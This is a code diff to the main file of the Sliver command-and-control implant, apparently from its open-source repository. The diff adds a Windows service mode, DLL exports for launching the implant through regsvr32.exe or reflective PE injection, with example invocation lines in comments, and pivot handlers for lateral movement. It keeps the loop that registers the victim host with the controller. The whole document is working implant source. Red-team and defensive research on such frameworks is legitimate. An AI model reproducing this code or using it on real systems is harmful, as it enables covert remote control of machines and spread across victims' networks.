@@ -19,7 +19,7 @@ package main
 */
 
 // {{if .IsSharedLib}}
-
+//#include "sliver.h"
 import "C"
 
 // {{end}}
@@ -28,7 +28,6 @@ import (
 	"os"
 	"os/user"
 	"runtime"
-	"time"
 
 	// {{if .Debug}}{{else}}
 	"io/ioutil"
@@ -36,23 +35,89 @@ import (
 
 	"log"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	consts "github.com/bishopfox/sliver/sliver/constants"
 	"github.com/bishopfox/sliver/sliver/handlers"
 	"github.com/bishopfox/sliver/sliver/limits"
+	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
 	"github.com/bishopfox/sliver/sliver/version"
 
 	"github.com/golang/protobuf/proto"
+
+	// {{if .IsService}}
+	"golang.org/x/sys/windows/svc"
+	// {{end}}
 )
 
+// {{if .IsService}}
+
+type sliverService struct{}
+
+func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
+	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown | svc.AcceptPauseAndContinue
+	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
+	for {
+		select {
+		default:
+			connection := transports.StartConnectionLoop()
+			if connection == nil {
+				break
+			}
+			mainLoop(connection)
+		case c := <-r:
+			switch c.Cmd {
+			case svc.Interrogate:
+				changes <- c.CurrentStatus
+			case svc.Stop, svc.Shutdown:
+				changes <- svc.Status{State: svc.Stopped, Accepts: cmdsAccepted}
+			case svc.Pause:
+				changes <- svc.Status{State: svc.Paused, Accepts: cmdsAccepted}
+			case svc.Continue:
+				changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
+			default:
+			}
+		}
+	}
+	return
+}
+
+// {{end}}
+
 // {{if .IsSharedLib}}
+
+var isRunning bool = false
 
 // RunSliver - Export for shared lib build
 //export RunSliver
 func RunSliver() {
-	main()
+	if !isRunning {
+		isRunning = true
+		main()
+	}
 }
+
+// Thanks Ne0nd0g for those
+//https://github.com/Ne0nd0g/merlin/blob/master/cmd/merlinagentdll/main.go#L65
+
+// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
+//export VoidFunc
+func VoidFunc() { main() }
+
+// DllInstall is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /n /i sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
+//export DllInstall
+func DllInstall() { main() }
+
+// DllRegisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
+// export DllRegisterServer
+func DllRegisterServer() { main() }
+
+// DllUnregisterServer - is used when executing the Sliver implant with regsvr32.exe (i.e. regsvr32.exe /s /u sliver.dll)
+// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
+// export DllUnregisterServer
+func DllUnregisterServer() { main() }
 
 // {{end}}
 
@@ -71,36 +136,49 @@ func main() {
 
 	limits.ExecLimits() // Check to see if we should execute
 
+	// {{if .IsService}}
+	svc.Run(os.Args[1], &sliverService{})
+	// {{else}}
 	for {
 		connection := transports.StartConnectionLoop()
 		if connection == nil {
 			break
 		}
 		mainLoop(connection)
-		// {{if .Debug}}
-		log.Printf("Lost connection, sleeping ...")
-		// {{end}}
-		time.Sleep(60 * time.Second) // TODO: Make configurable
 	}
+	// {{end}}
 }
 
 func mainLoop(connection *transports.Connection) {
 
 	connection.Send <- getRegisterSliver() // Send registration information
 
+	// Reconnect active pivots
+	pivots.ReconnectActivePivots(connection)
+
+	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
+	sysPivotHandlers := handlers.GetSystemPivotHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] specialHandler %d", envelope.Type)
+			// {{end}}
 			handler(envelope.Data, connection)
+		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope.Data, func(data []byte, err error) {
-				connection.Send <- &pb.Envelope{
+				connection.Send <- &sliverpb.Envelope{
 					ID:   envelope.ID,
 					Data: data,
 				}
@@ -110,15 +188,25 @@ func mainLoop(connection *transports.Connection) {
 			log.Printf("[recv] tunHandler %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
+		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
 		} else {
 			// {{if .Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
 			// {{end}}
+			connection.Send <- &sliverpb.Envelope{
+				ID:                 envelope.ID,
+				Data:               nil,
+				UnknownMessageType: true,
+			}
 		}
 	}
 }
 
-func getRegisterSliver() *pb.Envelope {
+func getRegisterSliver() *sliverpb.Envelope {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Debug}}
@@ -151,7 +239,7 @@ func getRegisterSliver() *pb.Envelope {
 			filename = "<< error >>"
 		}
 	}
-	data, err := proto.Marshal(&pb.Register{
+	data, err := proto.Marshal(&sliverpb.Register{
 		Name:     consts.SliverName,
 		Hostname: hostname,
 		Username: currentUser.Username,
@@ -166,12 +254,12 @@ func getRegisterSliver() *pb.Envelope {
 	})
 	if err != nil {
 		// {{if .Debug}}
-		log.Printf("Failed to encode Register msg %s", err)
+		log.Printf("Failed to encode register msg %s", err)
 		// {{end}}
 		return nil
 	}
-	return &pb.Envelope{
-		Type: pb.MsgRegister,
+	return &sliverpb.Envelope{
+		Type: sliverpb.MsgRegister,
 		Data: data,
 	}
 }
